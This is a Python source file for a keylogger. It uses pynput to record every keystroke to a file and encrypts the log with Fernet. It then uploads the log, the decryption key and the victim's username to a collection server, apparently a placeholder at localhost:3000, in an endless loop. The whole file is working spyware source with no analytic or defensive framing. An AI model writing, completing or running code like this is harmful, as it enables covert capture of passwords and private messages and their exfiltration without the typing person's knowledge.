from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import os
import getpass
import requests
import time

# File paths and encryption key
keys_information = "key_log.txt"
encrypted_keys_information = "e_key_log.txt"
key_file = "encryption_key.key"
server_url = "http://localhost:3000"  # URL of the server

# Generate or load encryption key
if not os.path.exists(key_file):
    key = Fernet.generate_key()
    with open(key_file, 'wb') as kf:
        kf.write(key)
else:
    with open(key_file, 'rb') as kf:
        key = kf.read()

cipher = Fernet(key)

# Function to encrypt and save keystrokes
def encrypt_log():
    with open(keys_information, 'rb') as f:
        data = f.read()
    encrypted_data = cipher.encrypt(data)
    with open(encrypted_keys_information, 'wb') as f:
        f.write(encrypted_data)
    os.remove(keys_information)  # Clean up original log file

# Function to upload encrypted logs and encryption key to the server
def upload_logs_and_key(log_path, key_path):
    with open(log_path, 'rb') as log_file:
        log_data = log_file.read()
    with open(key_path, 'rb') as key_file:
        key_data = key_file.read()
    
    response = requests.post(server_url, data={
        'uid': os.getpid(),  # Use process ID as unique ID
        'username': getpass.getuser(),
    }, files={
        'log': log_data,
        'key': key_data
    })
    
    if response.status_code == 200:
        print("Log and key uploaded successfully")
    else:
        print("Failed to upload log and key")

# Function to start keylogging
def start_keylogger():
    global keys, count
    keys = []
    count = 0

    # Log keystrokes
    def on_press(key):
        global keys, count
        keys.append(key)
        count += 1
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(keys_information, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:  # Stop on escape key
            return False

    # Start the keylogger listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Main loop to continuously start keylogging sessions
if __name__ == "__main__":
    while True:
        # Start a keylogging session
        start_keylogger()
        
        # Encrypt log file and upload to server
        if os.path.exists(keys_information):
            encrypt_log()
            upload_logs_and_key(encrypted_keys_information, key_file)
        
        time.sleep(1)
